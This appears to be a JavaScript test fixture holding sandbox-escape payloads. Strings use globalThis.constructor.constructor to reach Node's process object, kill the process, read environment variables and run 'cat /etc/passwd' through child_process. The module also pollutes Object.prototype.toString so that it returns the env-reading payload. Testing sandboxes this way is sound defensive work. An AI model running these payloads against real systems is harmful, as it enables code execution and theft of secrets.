const maliciousСode =
  'globalThis.constructor.constructor("return process")().exit()';
const maliciousСode2 =
  'globalThis.constructor.constructor("return process.env")()';
const maliciousСode3 =
  "globalThis.constructor.constructor(\"return process.mainModule.require('child_process').execSync('cat /etc/passwd',{encoding:'utf-8'})\")()";

const spy = {};
spy.__proto__.toString = () => maliciousСode2;

export default spy;